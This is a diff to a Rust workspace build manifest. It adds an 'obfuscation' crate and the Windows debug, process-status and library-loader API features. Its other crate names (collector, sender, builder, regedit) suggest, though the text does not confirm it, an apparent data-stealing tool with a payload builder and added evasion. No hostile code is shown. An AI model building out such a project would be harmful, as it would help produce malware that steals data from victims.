@@ -30,7 +30,8 @@ members = [
     "filesystem",
     "regedit",
     "sender",
-    "builder"
+    "builder",
+    "obfuscation"
 ]
 
 [workspace.dependencies]
@@ -58,7 +59,10 @@ windows-sys = { version = "0.60.2", features = [
     "Win32_UI_WindowsAndMessaging",
     "Win32_System_DataExchange",
     "Win32_System_Registry",
-    "Win32_System_Memory"
+    "Win32_System_Memory",
+    "Win32_System_Diagnostics_Debug",
+    "Win32_System_ProcessStatus",
+    "Win32_System_LibraryLoader"
 ] }
 
 [profile.release]
@@ -81,6 +85,7 @@ collector = { path = "collector" }
 zip = { path = "zip" }
 filesystem = { path = "filesystem" }
 sender = { path = "sender" }
+obfuscation = { path = "obfuscation" }
 rand_chacha = { version = "0.9.0", default-features = false }
 rand_core = { version = "0.9.3", default-features = false }
 cfg-if = "1.0.1"
